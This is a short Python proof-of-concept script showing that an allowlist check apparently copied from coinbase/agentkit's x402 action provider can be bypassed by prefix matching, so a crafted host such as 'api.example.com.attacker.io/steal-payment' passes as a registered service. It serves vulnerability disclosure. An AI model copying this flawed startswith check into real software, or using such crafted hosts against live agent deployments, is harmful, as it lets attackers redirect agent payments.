"""Standalone PoC for the is_service_registered() prefix-matching allowlist
bypass in coinbase/agentkit's Python X402ActionProvider.

Function body copied verbatim from:
python/coinbase-agentkit/coinbase_agentkit/action_providers/x402/utils.py
"""

from urllib.parse import urlparse


def is_service_registered(url: str, registered_services: set) -> bool:
    if not registered_services:
        return False
    try:
        parsed = urlparse(url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        for registered in registered_services:
            if origin == registered or url.startswith(registered):
                return True
        return False
    except Exception:
        return False


# Operator config, exactly as shown in the TS package's README example
# (the Python package config shape is equivalent):
registered_services = {"https://api.example.com", "https://weather.x402.io"}

legit = "https://api.example.com/v1/data"
attacker_host = "https://api.example.com.attacker.io/steal-payment"

print("registered_services:", registered_services)
print()
print("legit URL              :", legit)
print("  is_service_registered ->", is_service_registered(legit, registered_services))
print()
print("attacker-controlled URL:", attacker_host)
print("  is_service_registered ->", is_service_registered(attacker_host, registered_services))

a = urlparse(legit)
b = urlparse(attacker_host)
print()
print("legit    netloc:", a.netloc)
print("attacker netloc:", b.netloc)
print("Same host?", a.netloc == b.netloc)

assert is_service_registered(attacker_host, registered_services) is True
assert a.netloc != b.netloc
print("\n[CONFIRMED] allowlist bypass: attacker-controlled host passes is_service_registered()")
